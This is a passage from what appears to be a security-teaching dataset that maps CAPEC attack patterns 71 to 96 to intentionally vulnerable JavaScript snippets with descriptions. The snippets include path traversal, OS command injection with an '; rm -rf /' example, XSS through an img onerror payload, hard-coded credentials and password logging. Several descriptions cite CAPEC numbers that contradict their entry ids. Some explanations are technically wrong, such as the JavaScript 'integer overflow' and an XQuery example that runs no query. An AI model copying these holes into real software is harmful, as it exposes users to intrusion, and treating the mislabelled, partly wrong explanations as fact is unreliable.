        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism using a list of default credentials. The `defaultCredentials` array contains common username and password pairs that are often used as default credentials in many systems. The `authenticate` function checks if the provided username and password match any of the default credentials. If a match is found, it returns true, indicating successful authentication; otherwise, it returns false. This code embodies the main idea of CAPEC-562, which highlights the risk of using common or default usernames and passwords. The related CWEs, such as CWE-521 (Weak Password Requirements) and CWE-798 (Use of Hard-coded Credentials), are represented by the use of simple, hard-coded default credentials that make the system vulnerable to unauthorized access."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (/[^a-zA-Z0-9]/.test(input)) {\n    throw new Error('Invalid input');\n  }\n  // Canonicalization step\n  const canonicalInput = decodeURIComponent(input);\n  // Further processing\n  console.log('Processing input:', canonicalInput);\n}\n\ntry {\n  // Unicode encoded input to bypass validation\n  validateInput('%E2%82%AC'); // Unicode for \u20ac\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before canonicalization, allowing an attacker to bypass validation using Unicode encoding. The `validateInput` function first checks if the input contains any non-alphanumeric characters and throws an error if it does. However, this validation occurs before the input is canonicalized using `decodeURIComponent`. An attacker can provide a Unicode-encoded string (e.g., '%E2%82%AC' for the Euro symbol) that passes the initial validation but may contain malicious content after decoding. This example highlights the importance of proper input handling and the risks associated with incorrect behavior order and improper handling of Unicode encoding."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let filePath = decodeURIComponent(parsedUrl.query.filePath);\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(data);\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads a file specified by a URL parameter and returns its contents. The code demonstrates vulnerabilities related to URL encoding and improper handling of user input. Specifically, it decodes the 'filePath' parameter from the URL without proper validation (CWE-173, CWE-177, CWE-20), allowing an attacker to manipulate the file path (CWE-73). This can lead to unauthorized file access or directory traversal attacks. The code also does not neutralize special elements in the file path, which could be exploited for injection attacks (CWE-74)."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  const filename = req.body.filename;\n  // Vulnerable code: directly using user input without validation or encoding\n  const filePath = `/uploads/${filename}`;\n  res.send(`<a href=\"${filePath}\">Download your file</a>`);\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet sets up an Express.js server that handles file uploads. The server takes a filename from user input and directly uses it to create a file path, which is then embedded in an HTML link. This code is vulnerable to attacks because it does not validate or encode the user input, allowing an attacker to insert malicious characters or scripts. This embodies the 'User-Controlled Filename' CAPEC, demonstrating how improper input validation (CWE-20), improper encoding or escaping of output (CWE-116), and other related weaknesses can lead to security vulnerabilities."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\n// Insecurely storing sensitive information in a cookie\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (authenticate(username, password)) {\n    // Vulnerable: Storing sensitive information in cleartext\n    res.cookie('session', JSON.stringify({ username, role: 'user' }), { httpOnly: true });\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Manipulating state by modifying the cookie\napp.get('/elevate', (req, res) => {\n  let session = JSON.parse(req.cookies.session);\n  if (session && session.username) {\n    // Vulnerable: Elevating privileges by modifying state\n    session.role = 'admin';\n    res.cookie('session', JSON.stringify(session), { httpOnly: true });\n    res.send('Privileges elevated');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nfunction authenticate(username, password) {\n  // Dummy authentication function\n  return username === 'user' && password === 'pass';\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express.js that is vulnerable to state manipulation attacks. The code insecurely stores sensitive information (username and role) in a cookie in cleartext (CWE-315). An attacker can manipulate the state by modifying the cookie to elevate privileges (e.g., changing the role from 'user' to 'admin'). This embodies the main idea of the CAPEC 'Manipulating State' by showing how an adversary can modify state information to gain unauthorized access or privileges. The code also highlights the importance of proper state management and secure storage of sensitive information."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "const fs = require('fs');\nconst configFilePath = './config.json';\n\n// Read the configuration file\nlet configData = fs.readFileSync(configFilePath, 'utf8');\n\n// Parse the configuration data\nlet config;\ntry {\n  config = JSON.parse(configData);\n} catch (e) {\n  console.error('Invalid JSON format in configuration file.');\n  process.exit(1);\n}\n\n// Simulate accepting untrusted data\nconst userInput = process.argv[2];\nconfig.trustedSetting = userInput;\n\n// Write the modified configuration back to the file\nfs.writeFileSync(configFilePath, JSON.stringify(config, null, 2));\n\nconsole.log('Configuration updated successfully.');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to manipulating writable configuration files. The code reads a configuration file (config.json), parses it, and then updates a configuration setting with user input. This user input is not validated or sanitized, which embodies CWE-349 (Acceptance of Extraneous Untrusted Data With Trusted Data) and CWE-77 (Command Injection). The code then writes the modified configuration back to the file, potentially allowing an attacker to inject malicious data or commands. This represents the main idea of the CAPEC, where unauthorized modification of configuration files can lead to unauthorized access or behavior in the application."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst path = require('path');\nconst app = express();\n\napp.get('/read-file', (req, res) => {\n  const filePath = path.join(__dirname, 'files', req.query.file);\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      return res.status(500).send('Error reading file');\n    }\n    res.send(data);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server with an endpoint '/read-file' that reads and returns the contents of a file specified by the 'file' query parameter. The code is vulnerable to path traversal attacks (CWE-22, CWE-23) because it directly uses user input to construct a file path without proper validation or neutralization of special elements like '..'. This allows an attacker to manipulate the input to access files outside the intended directory. The code also demonstrates CWE-73 by allowing external control of the file path, and CWE-285 by not performing proper authorization checks to ensure the user is allowed to access the requested file."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/updateSettings', (req, res) => {\n  const userSettings = req.body;\n  // Directly using user input without validation\n  global.settings = userSettings;\n  res.send('Settings updated');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where user-controlled variables are directly used to update global settings without any validation or sanitization. The Express.js server listens for POST requests to the '/updateSettings' endpoint and directly assigns the user-provided settings to a global variable. This can lead to various security issues such as external control of system settings (CWE-15), improper authorization (CWE-285), and potential code injection (CWE-94). The code embodies the main idea of the CAPEC by showing how untrusted user input can manipulate application behavior and configuration."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(userInput) {\n  // Validate input before canonicalization (CWE-180)\n  if (!/^[a-zA-Z0-9_\\/]+$/.test(userInput)) {\n    throw new Error('Invalid input');\n  }\n\n  // Canonicalize the path\n  const safePath = path.normalize(userInput);\n\n  // Validate the canonicalized path (CWE-22)\n  if (safePath.includes('..')) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Read the file (CWE-73)\n  fs.readFile(safePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n    } else {\n      console.log('File content:', data);\n    }\n  });\n}\n\n// Example usage\nreadFile('..\\/etc\\/passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerable file reading function that embodies the main idea of CAPEC-Using Escaped Slashes in Alternate Encoding. The function `readFile` takes user input to read a file from the filesystem. It first attempts to validate the input using a regular expression, but this validation occurs before canonicalizing the path (CWE-180). The path is then normalized using `path.normalize`, which can transform the input into a different form. After normalization, the code checks for path traversal attempts by looking for '..' in the canonicalized path (CWE-22). However, this approach is flawed because the initial validation does not account for alternate encodings, allowing an attacker to bypass the checks using escaped slashes or other encoding tricks. The code also demonstrates improper handling of user input that influences file paths (CWE-73)."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(filePath) {\n  // Validate input before canonicalization\n  if (!filePath.match(/^[a-zA-Z0-9_\\/\\\\]+$/)) {\n    throw new Error('Invalid file path');\n  }\n\n  // Canonicalize the path\n  const canonicalPath = path.normalize(filePath);\n\n  // Check for path traversal\n  if (canonicalPath.includes('..')) {\n    throw new Error('Path traversal detected');\n  }\n\n  // Read the file\n  fs.readFile(canonicalPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n    } else {\n      console.log('File content:', data);\n    }\n  });\n}\n\n// Example usage\nreadFile('..\\\\etc\\\\passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerable file reading function that embodies the main idea of CAPEC-147: Using Slashes in Alternate Encoding. The function `readFile` takes a file path as input and attempts to read the file's content. The code first validates the input using a regular expression to check for valid characters, but this validation occurs before canonicalizing the path. This can lead to improper handling of alternate encodings and potential bypass of security checks. The path is then canonicalized using `path.normalize`, but the check for path traversal (`..`) is performed after this step, which is incorrect behavior order. This can allow an attacker to use alternate encodings of slashes to bypass the validation and perform a path traversal attack, potentially accessing sensitive files. The code snippet highlights the importance of proper input validation, canonicalization, and filtering to prevent such vulnerabilities."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.input;\n  // Validate input before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // Canonicalize input\n  const canonicalInput = decodeURIComponent(escape(userInput));\n  // Use the input in a file path\n  const filePath = `/uploads/${canonicalInput}.txt`;\n  res.send(`File path is: ${filePath}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that accepts POST requests at the '/submit' endpoint. The user input is first validated using a regular expression to ensure it only contains alphanumeric characters. However, this validation occurs before the input is canonicalized, which is a critical mistake. The input is then canonicalized using `decodeURIComponent(escape(userInput))`, which can transform UTF-8 encoded characters into their canonical form. This sequence of operations can allow an attacker to bypass the initial validation by submitting UTF-8 encoded input that, when canonicalized, results in invalid or harmful data. The code then constructs a file path using the potentially harmful input, demonstrating CWE-73 (External Control of File Name or Path) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component). This example embodies the main idea of CAPEC-167 by showing how improper handling of UTF-8 encoding can lead to security vulnerabilities."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const logEntry = `${new Date().toISOString()} - ${req.method} ${req.url} - ${req.headers['user-agent']}`;\n  fs.appendFile('server.log', logEntry + '\\n', (err) => {\n    if (err) throw err;\n  });\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, world!');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server logs each request to a file named 'server.log'. The log entry includes the current timestamp, HTTP method, URL, and user-agent header. However, the code does not sanitize or validate the input from the request, making it vulnerable to log tampering attacks. An attacker could inject malicious data into the logs by manipulating the request headers or URL, potentially masking other malicious activities or targeting log processing agents. This example embodies the main idea of CAPEC- Web Server Logs Tampering and highlights related CWEs such as Improper Output Neutralization for Logs (CWE-117), CRLF Injection (CWE-93), and Improper Input Validation (CWE-20)."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, { explicitArray: false }, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library without any schema validation or proper security measures. This code is vulnerable to several XML-related attacks, such as XML External Entity (XXE) attacks (CWE-611), XML Injection (CWE-91), and XML Entity Expansion (CWE-776). The lack of validation and improper handling of XML content can lead to denial of service (DoS) attacks or unauthorized access to sensitive data, embodying the main idea of the deprecated CAPEC related to XML Denial of Service (XDoS)."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  const userInput = req.body.query;\n  const xmlData = '<users><user><name>John</name><password>1234</password></user></users>';\n  const xpath = `//user[name/text()='${userInput}']`;\n\n  xml2js.parseString(xmlData, (err, result) => {\n    if (err) {\n      res.status(500).send('Error parsing XML');\n      return;\n    }\n    const user = result.users.user.find(u => u.name[0] === userInput);\n    if (user) {\n      res.send(`User found: ${user.name[0]}`);\n    } else {\n      res.send('User not found');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application endpoint that is susceptible to XPath Injection. The application uses the Express framework to handle HTTP POST requests to the '/search' endpoint. It takes user input from the request body and constructs an XPath expression to search an XML database. The user input is directly embedded into the XPath query without proper sanitization, making it vulnerable to XPath Injection attacks. An attacker can manipulate the input to alter the structure of the XPath query, potentially bypassing authentication or accessing unauthorized data. This example highlights the importance of proper input validation and neutralization to prevent injection vulnerabilities."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst xml2js = require('xml2js');\nconst fs = require('fs');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  const userInput = req.body.query;\n  const xquery = `for $x in doc('users.xml')/users/user where $x/name = '${userInput}' return $x`;\n\n  fs.readFile('users.xml', 'utf8', (err, data) => {\n    if (err) {\n      res.status(500).send('Error reading XML file');\n      return;\n    }\n\n    xml2js.parseString(data, (err, result) => {\n      if (err) {\n        res.status(500).send('Error parsing XML file');\n        return;\n      }\n\n      // Simulate XQuery execution (vulnerable to injection)\n      const users = result.users.user.filter(user => user.name[0] === userInput);\n      res.send(users);\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of an XQuery injection attack. The code sets up an Express server that listens for POST requests on the '/search' endpoint. It reads user input from the request body and constructs an XQuery expression using this input without proper neutralization. The XQuery expression is then used to filter user data from an XML file. This code is vulnerable to XQuery injection because it directly incorporates user input into the query, allowing an attacker to manipulate the query structure and potentially access unauthorized data. This example embodies the main idea of CAPEC-74 and related CWEs, highlighting the risks of improper neutralization of special elements in data used by downstream components."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "function fetchData() {\n    var xhr = new XMLHttpRequest();\n    xhr.open('GET', '/api/data?param=' + document.location.hash.substring(1), true);\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState == 4 && xhr.status == 200) {\n            document.getElementById('output').innerHTML = xhr.responseText;\n        }\n    };\n    xhr.send();\n}\n\nwindow.onload = function() {\n    fetchData();\n    setInterval(fetchData, 5000); // Frequent AJAX requests\n};",
        "description": "This JavaScript code snippet demonstrates an AJAX footprinting scenario. The `fetchData` function makes frequent AJAX requests to a server endpoint, appending a user-controlled parameter from the URL hash. The server's response is then directly inserted into the DOM without proper sanitization. This setup can be exploited by an attacker to perform footprinting by analyzing the responses to different inputs, potentially discovering vulnerabilities such as XSS (CWE-79) if the server response includes unsanitized user input. The frequent AJAX requests (every 5 seconds) mimic the rapid, multiple requests typical in AJAX applications, which can be leveraged for scanning and enumeration of the target environment."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>Welcome!</h1><p>Your User-Agent: ${userAgent}</p></body></html>`);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server using Node.js. The server reads the 'User-Agent' header from the incoming HTTP request and includes it in the HTML response without any validation or sanitization. This can lead to Cross-Site Scripting (XSS) vulnerabilities if an attacker manipulates the 'User-Agent' header to include malicious scripts. The code snippet demonstrates the main idea of CAPEC-202: 'XSS Through HTTP Headers', and highlights related CWEs such as CWE-80, CWE-79, and CWE-644, which involve improper neutralization of input in web pages and HTTP headers."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Simulated user roles\nconst users = {\n  'user1': 'admin',\n  'user2': 'guest'\n};\n\n// Middleware to check authentication\nfunction checkAuth(req, res, next) {\n  const user = req.query.user;\n  if (user && users[user]) {\n    req.user = user;\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Middleware to check authorization\nfunction checkAdmin(req, res, next) {\n  if (users[req.user] === 'admin') {\n    next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Public route\napp.get('/public', (req, res) => {\n  res.send('This is a public page');\n});\n\n// Admin route\napp.get('/admin', checkAuth, (req, res) => {\n  res.send('This is an admin page');\n});\n\n// Start the server\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with two routes: a public route and an admin route. The admin route is intended to be protected by an authentication middleware (`checkAuth`). However, it lacks proper authorization checks, allowing any authenticated user to access the admin route, embodying the concept of 'Forceful Browsing' (CAPEC-111). This vulnerability is related to CWE-425 (Direct Request), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure). The code demonstrates how an attacker could directly access the '/admin' URL by simply being authenticated, without proper role-based access control."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // User input is directly used in the command",
        "description": "This JavaScript code snippet demonstrates an OS Command Injection vulnerability. The function `executeCommand` takes user input and directly incorporates it into an `exec` call to list directory contents using the `ls` command. This is vulnerable to injection attacks because it does not properly validate or sanitize the user input. An attacker could provide input like `; rm -rf /` to execute arbitrary commands, potentially compromising the system. This example embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (OS Command Injection) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const targetHost = 'trustedbank.com';\n  const targetIP = '192.168.1.1';\n\n  dns.reverse(req.connection.remoteAddress, (err, hostnames) => {\n    if (err || !hostnames.includes(targetHost)) {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n      return;\n    }\n\n    http.get(`http://${targetIP}`, (proxyRes) => {\n      let data = '';\n      proxyRes.on('data', (chunk) => { data += chunk; });\n      proxyRes.on('end', () => {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      });\n    }).on('error', () => {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n    });\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that attempts to validate the origin of incoming requests using reverse DNS resolution. The server checks if the hostname of the incoming request matches a trusted host ('trustedbank.com'). If the check fails, it denies access. If the check passes, it proxies the request to a target IP ('192.168.1.1'). This code is vulnerable to pharming attacks because it relies on reverse DNS resolution (CWE-350) and does not properly verify the integrity of the data being proxied (CWE-494). An attacker could manipulate DNS responses to impersonate the trusted host, leading users to a malicious site."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const message = data.toString();\n    if (message.startsWith('CHALLENGE:')) {\n      const challenge = message.split(':')[1];\n      // Reflect the challenge back to the client\n      socket.write(`RESPONSE:${challenge}`);\n    } else if (message.startsWith('RESPONSE:')) {\n      const response = message.split(':')[1];\n      // Assume the response is valid and grant access\n      if (response === 'expected_response') {\n        socket.write('ACCESS GRANTED');\n      } else {\n        socket.write('ACCESS DENIED');\n      }\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  // Send a challenge to the server\n  client.write('CHALLENGE:12345');\n});\n\nclient.on('data', (data) => {\n  const message = data.toString();\n  if (message.startsWith('RESPONSE:')) {\n    const response = message.split(':')[1];\n    // Reflect the response back to the server\n    client.write(`RESPONSE:${response}`);\n  } else if (message === 'ACCESS GRANTED') {\n    console.log('Access granted to the system');\n  } else {\n    console.log('Access denied');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a simple authentication protocol that is vulnerable to a reflection attack. The server sends a challenge to the client, and the client reflects the challenge back to the server as a response. The server then grants access based on the reflected response. This code embodies the main idea of CAPEC-301, where an adversary can abuse the authentication protocol by reflecting the challenge back to the server, thereby gaining illegitimate access. The code also touches on related CWEs such as incorrect implementation of the authentication algorithm (CWE-303) and authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "<html>\n<body>\n  <img src=\"x\" onerror=\"alert('XSS')\">\n</body>\n</html>",
        "description": "This HTML code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability within an IMG tag. The 'src' attribute of the IMG tag is set to an invalid value ('x'), which triggers the 'onerror' event. The 'onerror' event handler contains a JavaScript alert function, which will execute when the image fails to load. This example embodies the main idea of the deprecated CAPEC-16, which is now part of CAPEC-18, by showing how improper neutralization of script in attributes of IMG tags (CWE-82) can lead to XSS. The code also highlights the risk of improper neutralization of alternate XSS syntax (CWE-87) and basic XSS (CWE-80), as well as the potential failure of denylist-based protections (CWE-692) and doubled character manipulations (CWE-85)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "function vulnerableFunction(userInput) {\n  let buffer = new ArrayBuffer(8); // Allocate 8 bytes\n  let view = new DataView(buffer);\n  let offset = userInput * 4; // Calculate offset\n\n  // Integer overflow check is missing\n  view.setInt32(offset, 42); // Write to the buffer\n\n  console.log('Value set at offset:', offset);\n}\n\n// Example usage\nvulnerableFunction(536870912); // This will cause an integer overflow",
        "description": "This JavaScript code snippet demonstrates a forced integer overflow vulnerability. The function `vulnerableFunction` takes `userInput` as an argument and calculates an offset by multiplying `userInput` by 4. If `userInput` is large enough, this multiplication can cause an integer overflow, resulting in an incorrect and potentially dangerous offset value. The code then attempts to write to this offset in a buffer, which can lead to unexpected behavior, such as a buffer overflow. This example embodies the main idea of the CAPEC by showing how an attacker can manipulate an integer variable to go out of range, leading to vulnerabilities like buffer overflows and potential arbitrary code execution."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // Vulnerable log entry\n  fs.appendFile('server.log', `User login attempt: ${username}, Password: ${password}\\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate login process\n  if (username === 'admin' && password === 'password') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable logging mechanism in an Express.js application. The code logs user login attempts, including both the username and password, directly into a log file without any sanitization or neutralization of special characters. This can lead to several vulnerabilities as described in the CAPEC and related CWEs:\n\n1. **Improper Output Neutralization for Logs (CWE-117)**: The log entry does not neutralize special characters, allowing an attacker to inject malicious log entries.\n2. **Failure to Sanitize Special Elements (CWE-75)**: User input is directly logged without filtering special elements, which could be used to manipulate log files.\n3. **Improper Neutralization of Escape, Meta, or Control Sequences (CWE-150)**: The log entry does not handle escape sequences, which could be exploited to alter log file interpretation.\n4. **Insertion of Sensitive Information into Log File (CWE-532)**: Sensitive information, such as passwords, is logged, which could be exposed to attackers.\n5. **Logging of Excessive Data (CWE-779)**: Logging sensitive and excessive information can make log files difficult to manage and analyze, hindering forensic efforts.\n\nThe main idea of the CAPEC is to highlight the risks associated with improper logging practices, which can be exploited by attackers to manipulate log files, cover their tracks, or gain sensitive information."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "const http = require('http');\nconst net = require('net');\n\nconst proxy = http.createServer((req, res) => {\n  const options = {\n    hostname: 'target-server.com',\n    port: 80,\n    path: req.url,\n    method: req.method,\n    headers: req.headers\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    proxyRes.pipe(res, { end: true });\n  });\n\n  req.pipe(proxyReq, { end: true });\n});\n\nproxy.on('connect', (req, clientSocket, head) => {\n  const { port, hostname } = new URL(`http://${req.url}`);\n  const serverSocket = net.connect(port || 80, hostname, () => {\n    clientSocket.write('HTTP/1.1 200 Connection Established\\r\\n' +\n                       'Proxy-agent: Node.js-Proxy\\r\\n' +\n                       '\\r\\n');\n    serverSocket.write(head);\n    serverSocket.pipe(clientSocket);\n    clientSocket.pipe(serverSocket);\n  });\n});\n\nproxy.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP proxy server using Node.js. The proxy server listens on port 8080 and forwards incoming HTTP requests to a target server ('target-server.com'). The proxy also handles HTTPS connections by tunneling the data between the client and the target server. This setup embodies the 'Adversary in the Middle (AiTM)' concept by intercepting and potentially altering the communication between the client and the server. The code does not verify the identity of the endpoints (CWE-300) and could be exploited to bypass authentication (CWE-287, CWE-290) or replay captured data (CWE-294)."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\n// Expose WSDL file\napp.get('/service.wsdl', (req, res) => {\n  fs.readFile('path/to/service.wsdl', 'utf8', (err, data) => {\n    if (err) {\n      res.status(500).send('Error reading WSDL file');\n      return;\n    }\n    res.set('Content-Type', 'text/xml');\n    res.send(data);\n  });\n});\n\n// Example endpoint that uses sensitive query strings\napp.get('/getUserData', (req, res) => {\n  const userId = req.query.userId;\n  // Simulate database access\n  const userData = getUserDataFromDatabase(userId);\n  res.json(userData);\n});\n\nfunction getUserDataFromDatabase(userId) {\n  // Dummy data for demonstration\n  return { id: userId, name: 'John Doe', email: 'john.doe@example.com' };\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web service using the Express framework. The '/service.wsdl' endpoint exposes a WSDL file, which can be accessed by anyone, potentially revealing sensitive information about the web service's operations and parameters (CWE-651). Additionally, the '/getUserData' endpoint uses the HTTP GET method with a sensitive query string (userId), which can expose sensitive user information (CWE-598). This setup embodies the main idea of WSDL Scanning (CAPEC-###), where an attacker can exploit the exposed WSDL file and sensitive query strings to gather information and perform further attacks."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "const fs = require('fs');\n\nfunction readConfigFile(filePath) {\n  try {\n    if (!fs.existsSync(filePath)) {\n      throw new Error('Configuration file not found');\n    }\n    const data = fs.readFileSync(filePath, 'utf8');\n    return JSON.parse(data);\n  } catch (err) {\n    console.error('Error reading configuration file:', err.message);\n    // Fallback to default configuration\n    return { defaultConfig: true };\n  }\n}\n\nconst config = readConfigFile('/path/to/config.json');\nconsole.log('Configuration:', config);",
